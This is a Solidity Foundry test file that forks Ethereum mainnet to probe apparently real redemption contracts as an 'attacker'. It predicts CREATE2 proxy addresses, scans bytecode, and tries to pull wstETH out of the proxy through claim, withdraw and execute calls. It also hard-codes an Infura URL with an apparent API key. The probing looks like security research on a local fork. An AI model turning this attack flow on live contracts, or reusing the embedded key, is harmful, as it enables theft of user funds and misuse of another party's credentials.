// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ProxyCreationFlow is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Init code hash (same for R0 and R1!)
    bytes32 constant INIT_CODE_HASH = 0xa7afdc89189c0997287e337d2577f5aa7f1fa2faecf74ac9e05b6fdc306bfcd6;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FullRedeemFlowWithProxyCheck() public {
        console.log("=== FULL REDEEM FLOW WITH PROXY CHECK ===\n");

        // Calculate predicted proxy address for attacker
        bytes32 salt = bytes32(uint256(uint160(attacker)));
        address predictedProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_0,
            salt,
            INIT_CODE_HASH
        )))));

        console.log("Attacker:", attacker);
        console.log("Predicted proxy for attacker:", predictedProxy);
        console.log("Proxy code BEFORE redeem:", predictedProxy.code.length);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault wstETH before:", vaultBefore / 1e18);

        // Execute redeem
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        console.log("\nCalling redeem(1000e18)...");
        (bool success,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem success:", success);

        vm.stopPrank();

        console.log("\nProxy code AFTER redeem:", predictedProxy.code.length);

        // Wait and finalize
        vm.warp(block.timestamp + 7 days);

        vm.startPrank(attacker);
        console.log("\nCalling finalizeRedeem(0)...");
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem success:", s2);
        vm.stopPrank();

        console.log("\nProxy code AFTER finalize:", predictedProxy.code.length);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        uint256 proxyWstETH = IERC20(wstETH).balanceOf(predictedProxy);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
        console.log("Proxy wstETH:", proxyWstETH / 1e18);
    }

    function test_CheckIfProxyIsCreatedOnRedeem() public {
        console.log("=== CHECKING IF PROXY CREATED ON REDEEM ===\n");

        // Try with known addresses that have redeemed before
        // Let's check the R0 owner

        bytes32 slot0 = vm.load(REDEMPTION_0, bytes32(0));
        address r0Owner = address(uint160(uint256(slot0)));
        console.log("R0 owner:", r0Owner);

        bytes32 ownerSalt = bytes32(uint256(uint160(r0Owner)));
        address ownerProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_0,
            ownerSalt,
            INIT_CODE_HASH
        )))));

        console.log("Predicted proxy for R0 owner:", ownerProxy);
        console.log("Owner proxy code size:", ownerProxy.code.length);

        // Check more addresses
        console.log("\nChecking proxies for various addresses:");

        // Check RC
        bytes32 rcSalt = bytes32(uint256(uint160(REDEMPTION_CONTROLLER)));
        address rcProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_0,
            rcSalt,
            INIT_CODE_HASH
        )))));
        console.log("RC proxy:", rcProxy, "code:", rcProxy.code.length);

        // Check R1
        bytes32 r1Salt = bytes32(uint256(uint160(REDEMPTION_1)));
        address r1Proxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_0,
            r1Salt,
            INIT_CODE_HASH
        )))));
        console.log("R1 proxy:", r1Proxy, "code:", r1Proxy.code.length);

        // Let's try to find any existing proxies by scanning common patterns
        // A proxy would have small code size (minimal proxy is ~45 bytes)
    }

    function test_AnalyzeProxyInitCode() public view {
        console.log("=== ANALYZING PROXY INIT CODE ===\n");

        // The init code hash is 0xa7afdc89189c0997287e337d2577f5aa7f1fa2faecf74ac9e05b6fdc306bfcd6
        // This is keccak256 of the init code

        // The init code is likely a minimal proxy (EIP-1167) that delegates to an implementation
        // Let's find where the init code is in R0's bytecode

        bytes memory code = REDEMPTION_0.code;

        // Find the init code - it should be stored somewhere in the contract
        // Usually after CREATE2 there's a code copy from within the contract

        console.log("Looking for init code storage in R0:");

        // Search for CODECOPY patterns that might copy init code
        for (uint i = 5500; i < 5700 && i < code.length; i++) {
            if (uint8(code[i]) == 0x39) { // CODECOPY
                console.log("CODECOPY at:", i);
            }
            if (uint8(code[i]) == 0x3c) { // EXTCODECOPY
                console.log("EXTCODECOPY at:", i);
            }
        }

        // Look for the init code itself
        // EIP-1167 minimal proxy starts with: 363d3d373d3d3d363d73
        bytes memory minimalProxyPrefix = hex"363d3d373d3d3d363d73";

        console.log("\nSearching for minimal proxy init code pattern:");
        for (uint i = 0; i + 10 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 10 && match_; j++) {
                if (code[i + j] != minimalProxyPrefix[j]) match_ = false;
            }
            if (match_) {
                console.log("Found minimal proxy pattern at:", i);

                // Extract implementation address (next 20 bytes)
                address impl;
                bytes memory implBytes = new bytes(20);
                for (uint k = 0; k < 20 && i + 10 + k < code.length; k++) {
                    implBytes[k] = code[i + 10 + k];
                }
                assembly {
                    impl := mload(add(implBytes, 20))
                }
                console.log("Implementation:", impl);
            }
        }
    }

    function test_WhatHappensToProxyFunds() public {
        console.log("=== WHAT HAPPENS TO PROXY FUNDS ===\n");

        // If a proxy is created and receives funds, who can withdraw?

        deal(TASSET, attacker, 100000e18);

        // Calculate attacker's proxy
        bytes32 salt = bytes32(uint256(uint160(attacker)));
        address attackerProxy = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            REDEMPTION_0,
            salt,
            INIT_CODE_HASH
        )))));

        console.log("Attacker's predicted proxy:", attackerProxy);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create redemption
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        vm.stopPrank();

        // If proxy was created, it might receive funds during finalizeRedeem
        // Let's see if we can call functions on the proxy

        vm.warp(block.timestamp + 7 days);

        // Check proxy before finalize
        console.log("\nBefore finalize:");
        console.log("Proxy code:", attackerProxy.code.length);
        console.log("Proxy wstETH:", IERC20(wstETH).balanceOf(attackerProxy));

        vm.startPrank(attacker);
        REDEMPTION_0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();

        // Check after finalize
        console.log("\nAfter finalize:");
        console.log("Proxy code:", attackerProxy.code.length);
        console.log("Proxy wstETH:", IERC20(wstETH).balanceOf(attackerProxy));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));

        // If proxy has wstETH, can attacker claim it?
        if (IERC20(wstETH).balanceOf(attackerProxy) > 0) {
            console.log("\n*** PROXY HAS FUNDS! ***");

            // Try to call proxy directly
            vm.startPrank(attacker);

            (bool s1,) = attackerProxy.call(
                abi.encodeWithSignature("claim()")
            );
            console.log("claim():", s1);

            (bool s2,) = attackerProxy.call(
                abi.encodeWithSignature("withdraw(uint256)", IERC20(wstETH).balanceOf(attackerProxy))
            );
            console.log("withdraw:", s2);

            (bool s3,) = attackerProxy.call(
                abi.encodeWithSignature("execute(address,bytes)", wstETH, abi.encodeWithSignature("transfer(address,uint256)", attacker, IERC20(wstETH).balanceOf(attackerProxy)))
            );
            console.log("execute:", s3);

            vm.stopPrank();

            console.log("\nAttacker wstETH after attempts:", IERC20(wstETH).balanceOf(attacker));
        }
    }

    function test_TraceCreate2Trigger() public view {
        console.log("=== TRACING CREATE2 TRIGGER IN R0 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // CREATE2 is at 5608
        // What function leads to it?

        // Find JUMPDEST nearest to 5608
        console.log("JUMPDESTs near CREATE2 at 5608:");
        uint nearestBefore = 0;
        for (uint i = 5500; i < 5608; i++) {
            if (uint8(code[i]) == 0x5b) {
                nearestBefore = i;
                console.log("JUMPDEST at:", i);
            }
        }
        console.log("Nearest JUMPDEST before 5608:", nearestBefore);

        // What selector leads here?
        // Check the function selector dispatch at the beginning
        console.log("\nR0 selectors from dispatcher:");

        bytes4[] memory sels = new bytes4[](25);
        uint count = 0;
        for (uint i = 0; i < 400 && i < code.length && count < 25; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                bool isSelector = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) {
                        isSelector = true;
                        break;
                    }
                }
                if (isSelector && sel != bytes4(0) && uint32(sel) > 0x1000) {
                    sels[count] = sel;
                    count++;
                }
            }
        }

        // Check which selector is finalizeRedeem
        bytes4 finalizeSel = bytes4(keccak256("finalizeRedeem(uint256)"));
        console.log("finalizeRedeem selector:");
        console.logBytes4(finalizeSel);

        for (uint i = 0; i < count; i++) {
            if (sels[i] == finalizeSel) {
                console.log("FOUND finalizeRedeem at index", i);
            }
        }
    }
}
